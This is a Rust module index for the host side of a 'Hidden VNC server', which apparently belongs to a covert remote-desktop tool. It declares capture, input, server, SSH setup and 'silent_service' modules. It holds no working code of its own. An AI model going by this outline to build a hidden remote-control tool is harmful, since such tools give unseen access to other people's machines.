//! Host-side components for Hidden VNC server
#![allow(dead_code, unused_imports, unused_variables, unused_mut)]
#![allow(ambiguous_glob_reexports)]

pub mod desktop;
pub mod launcher;
pub mod capture;
pub mod capture_extensions;
pub mod capture_advanced;  // Option C: Advanced capture methods
pub mod server;
// pub mod input; // removed: no corresponding file exists
pub mod input_improved;
pub mod inputtemp;
pub mod ssh_setup;
pub mod service;
pub mod silent_service;

pub use desktop::*;
pub use launcher::*;
pub use capture::*;
pub use capture_extensions::*;
pub use capture_advanced::*;  // Export Option C functions
pub use server::*;
// pub use input::*; // removed: no corresponding module
pub use input_improved::*;
pub use inputtemp::*;
pub use ssh_setup::*;
pub use service::*;
pub use silent_service::*;